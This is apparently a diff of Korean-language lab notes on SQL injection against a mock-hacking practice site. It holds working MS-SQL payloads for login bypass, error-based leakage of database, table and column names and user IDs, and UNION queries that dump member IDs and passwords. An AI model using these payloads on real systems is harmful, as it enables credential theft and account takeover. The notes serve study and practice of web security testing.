@@ -1,0 +1,126 @@
+#모의해킹 사이트
+#http://61.39.155.24:50003/
+
+[SQLi]
+1. 개요
+ 1) 데이터베이스와 연동하는 서비스 페이지의 임의의 SQL문을 전달하여 공격자가 의도한 구문이 데이터베이스에서 실행되는 공격기법
+ 2) 구문삽입공격포인트: 사용자 입력폼 / URI의 파라미터 / HTTP Request Header의 쿠키필드 등
+
+2. 취약점 점검방법(주요정보통신기반시설_기술적_취약점_분석_평가_상세_가이드_(2017) - 619 Page~)
+ 1) 홈페이지 파라미터 값에 특수문자나 임의의 SQL 쿼리를 전달하고 DB 에러페이지가 반환되는지 확인
+  = 파라미터
+   - 사용자 입력폼
+   - URI 주소창에 파라미터 확인
+   - 링크 클릭 시 웹 프록시를 이용한 파라미터 확인
+  = 특수문자
+   - '(싱글쿼테이션)
+   - "(더블쿼테이션)
+  = 임의의 SQL문
+   - SELECT, UNION, HAVING, GROUP BY 등
+
+ 2) 참 SQL구문과 거짓 SQL구문을 각각 서버에 전달하였을 때 페이지의 반응이 서로 다른지 확인
+  = 참 SQL구문 예시
+   - 숫자만이 입력되어질 수 있는 구간: and 1=1 / and 1=2 / or 1=1 / or 1=2
+   - 문자열이 입력되어질 수 있는 구간: 'and 1=1 -- / 'and 1=2 -- / 'or 1=1 -- / 'or 1=2 --
+   - and: 비교연산자로 활용되며 앞 구문과 뒷 구문 둘다 참이여야만 참을 반환
+   - or: 비교연산자로 활용되며 앞 구문 또는 뒷 구문 중 하나가 참이면 참을 반환
+   - --: 뒷문장 주석처리를 뜻하며, 주석은 컴파일 과정에서 공백으로 처리되거나 무시됨
+
+ 3) 로그인 페이지 사용자 입력폼에 참이되는 SQL문 전달 시 로그인이 되는지 확인
+
+[Error Based SQLi]
+ #MS-SQL
+
+ #SQLi 취약점이 존재하는 웹 서비스 페이지와 연동하고 있는 데이터베이스 이름 알아내기
+  1. 로그인 페이지와 연동하고 있는 데이터베이스 이름 에러페이지에 노출 시켜보기
+   1) 'and db_name() > 1 --
+    = nvarchar 값 'oyesmall'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
+    => oyesmall
+
+ #SQLi 취약점이 존재하는 웹 서비스 페이지와 연동하고 있는 데이터베이스의 테이블명 및 컬러명 알아내기
+  1. 로그인 페이지와 연동하고 있는 테이블명 및 컬럼명 에러페이지에 노출 시켜보기
+   1) 'having 1=1 --
+    = 열 'Members.num'이(가) 집계 함수나 GROUP BY 절에 없으므로 SELECT 목록에서 사용할 수 없습니다.
+    => 테이블명: Members
+    => 컬럼명: num (기본키)
+
+   2) 'group by (num) --
+    = 열 'Members.user_id'이(가) 집계 함수나 GROUP BY 절에 없으므로 SELECT 목록에서 사용할 수 없습니다.
+    => 컬럼명: user_id (아이디)
+
+   3) 'group by num, user_id --
+    = 열 'Members.passwd'이(가) 집계 함수나 GROUP BY 절에 없으므로 SELECT 목록에서 사용할 수 없습니다.
+    => 컬럼명: passwd (패스워드)
+ 
+ #SQLi 취약점이 존재하는 웹 서비스 페이지와 연동하고 있는 데이터베이스의 테이블명의 레코드값 알아내기
+  1. 로그인 페이지와 연동하고 있는 데이터베이스의 회원의 아이디 에러페이지에 노출 시켜보기
+    1) 첫번째 아이디 노출 시키기
+     = 'or 1 in(SELECT user_id FROM Members WHERE num > 0) --
+      - varchar 값 'oyes'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
+      => 아이디: oyes
+
+   2) 두번째 아이디 노출 시키기
+    = 'or 1 in(SELECT user_id FROM Members WHERE user_id not in('oyes')) --
+      - varchar 값 'bisang2da'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
+      => 아이디: bisang2da
+
+   3) 세번째 아이디 노출 시키기
+    = 'or 1 in(SELECT user_id FROM Members WHERE user_id not in('oyes','bisang2da')) --
+      - varchar 값 'kisec'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
+      => 아이디: kisec
+   
+   4) Members 테이블의 행의 갯수!!
+    = 'or 1 in(select 'a'+cast(count(*) as varchar(100)) from members) --
+  
+[UNION SQLi]
+1. UNION
+2. 시스템 테이블
+[information_schema.tables]
+-------------------------------------------------------------------------------------
+[Column name	Data type		Description]
+TABLE_NAME	sysname		Table name
+
+[information_schema.columns]
+-------------------------------------------------------------------------------------
+[Column name	Data type		Description]
+TABLE_NAME	nvarchar(128)	Table name
+COLUMN_NAME	nvarchar(128)	Column name
+
+3. 회원의 아이디와 패스워드 노출 시키고 로그인(타사용자권한획득)
+ 1) DB내에 정보를 검색해서 출력해주는 페이지를 찾고 => 주소찾기 페이지
+
+ 2) 해당 페이지의 SQLi 취약점 점검
+
+ 3) 해당 페이지의 SQLi 취약점을 이용해서 UNION SQLi 시도
+'UNION SELECT '1','2','3','4',TABLE_NAME FROM information_schema.tables --
+=> 회원정보 테이블 이름을 노출: members
+
+'UNION SELECT '1','2','3','4',COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='members'  --
+=> 회원정보 중 아이디 컬럼명을 노출: user_id
+=> 회원정보 중 패스워드 컬러명을 노출: passwd
+
+ 7) 최종적으로 회원정보 테이블의 아이디와 패스워드 노출 UNION SQLi 공격
+'UNION SELECT '1','2','3',user_id,passwd FROM members --
+
+ 8) 출력된 회원의 아이디와 패스워드로 로그인 성공
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
